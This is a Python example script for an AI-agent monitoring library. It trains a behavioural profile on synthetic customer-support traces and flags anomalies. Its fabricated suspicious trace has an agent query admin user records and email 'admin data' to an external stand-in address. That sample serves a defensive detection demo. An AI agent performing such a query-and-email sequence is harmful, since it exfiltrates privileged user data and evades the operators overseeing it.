"""Example: monitoring a custom AI agent with spectra.

Demonstrates end-to-end usage: training a behavioral profile from
synthetic traces, starting the monitor, and analyzing a suspicious
trace for anomalies.
"""

from __future__ import annotations

import asyncio
import random
from datetime import UTC, datetime, timedelta

from spectra import Monitor
from spectra.models import AgentTrace, LLMCall, ToolCall
from spectra.profiler.trainer import ProfileTrainer


def generate_training_traces(count: int = 150) -> list[AgentTrace]:
    """Generate synthetic historical traces for profile training.

    Simulates a customer support agent that typically searches a
    knowledge base, optionally creates a ticket, and responds.
    """
    traces: list[AgentTrace] = []
    tool_patterns = [
        ["search_kb", "search_kb", "respond"],
        ["search_kb", "respond"],
        ["search_kb", "create_ticket", "respond"],
        ["search_kb", "send_email", "respond"],
    ]

    for i in range(count):
        started = datetime.now(UTC) - timedelta(days=random.randint(1, 30))
        pattern = random.choice(tool_patterns)
        num_llm_calls = random.randint(1, 3)

        trace = AgentTrace(
            agent_type="customer-support",
            task_id=f"task-{i}",
            user_id=f"user-{random.randint(1, 50)}",
            started_at=started,
            ended_at=started + timedelta(minutes=random.uniform(1, 5)),
            tool_calls=[
                ToolCall(
                    tool_name=name,
                    arguments={"query": f"customer question {i}"},
                    duration_ms=random.uniform(50, 500),
                    timestamp=started + timedelta(seconds=j * 10),
                )
                for j, name in enumerate(pattern)
            ],
            llm_calls=[
                LLMCall(
                    model="gpt-4",
                    total_tokens=random.randint(800, 2500),
                    duration_ms=random.uniform(200, 1000),
                    timestamp=started + timedelta(seconds=k * 15),
                )
                for k in range(num_llm_calls)
            ],
            output="Thank you for contacting support. " * random.randint(1, 3),
        )
        traces.append(trace)

    return traces


async def main() -> None:
    """Run the custom agent monitoring example."""
    random.seed(42)

    # Step 1: Generate training data
    print("Generating training traces...")
    training_traces = generate_training_traces(150)
    print(f"Generated {len(training_traces)} traces.")

    # Step 2: Train a behavioral profile
    print("\nTraining behavioral profile...")
    trainer = ProfileTrainer(min_traces=100)
    profile = trainer.train(
        agent_type="customer-support",
        traces=training_traces,
    )
    print(f"Profile trained. Known tools: {sorted(profile.known_tools)}")
    print(f"Avg tool calls/trace: {profile.volume_stats.tool_calls_mean:.1f}")
    print(f"Avg tokens/trace: {profile.volume_stats.total_tokens_mean:.0f}")

    # Step 3: Start the monitor
    print("\nStarting monitor...")
    monitor = Monitor(
        profile=profile,
        sensitivity="medium",
        response_policy={
            "CRITICAL": "block",
            "HIGH": "alert",
            "MEDIUM": "alert",
            "LOW": "log",
        },
    )
    monitor.start()
    print("Monitor running.")

    # Step 4: Analyze a normal trace
    print("\n--- Analyzing normal trace ---")
    now = datetime.now(UTC)
    normal_trace = AgentTrace(
        agent_type="customer-support",
        task_id="task-normal",
        started_at=now,
        ended_at=now + timedelta(minutes=2),
        tool_calls=[
            ToolCall(tool_name="search_kb", timestamp=now),
            ToolCall(
                tool_name="respond",
                timestamp=now + timedelta(seconds=10),
            ),
        ],
        llm_calls=[LLMCall(model="gpt-4", total_tokens=1200)],
        output="Thank you for contacting support.",
    )
    events = await monitor.analyze(normal_trace)
    print(f"Anomalies detected: {len(events)}")

    # Step 5: Analyze a suspicious trace
    print("\n--- Analyzing suspicious trace ---")
    suspicious_trace = AgentTrace(
        agent_type="customer-support",
        task_id="task-suspicious",
        started_at=now,
        ended_at=now + timedelta(minutes=15),
        tool_calls=[
            ToolCall(tool_name="search_kb", timestamp=now),
            ToolCall(
                tool_name="search_kb",
                timestamp=now + timedelta(seconds=5),
            ),
            ToolCall(
                tool_name="database_query",
                arguments={"query": "SELECT * FROM users WHERE role='admin'"},
                timestamp=now + timedelta(seconds=10),
            ),
            ToolCall(
                tool_name="send_email",
                arguments={"to": "external@suspicious.com", "body": "admin data"},
                timestamp=now + timedelta(seconds=15),
            ),
        ],
        llm_calls=[
            LLMCall(model="gpt-4", total_tokens=8000),
        ],
        output='```sql\nSELECT * FROM users WHERE role="admin"\n```',
    )
    events = await monitor.analyze(suspicious_trace)

    print(f"Anomalies detected: {len(events)}")
    for event in events:
        print(f"  [{event.severity.value}] {event.title}")
        print(f"    Score: {event.score:.2f}")
        print(f"    Action: {event.action_taken}")
        print(f"    {event.description[:120]}")
        print()

    # Summary
    summary = monitor.summary()
    print(f"Total anomalies: {summary['total_anomalies']}")
    print(f"Severity breakdown: {summary['severity_counts']}")


if __name__ == "__main__":
    asyncio.run(main())
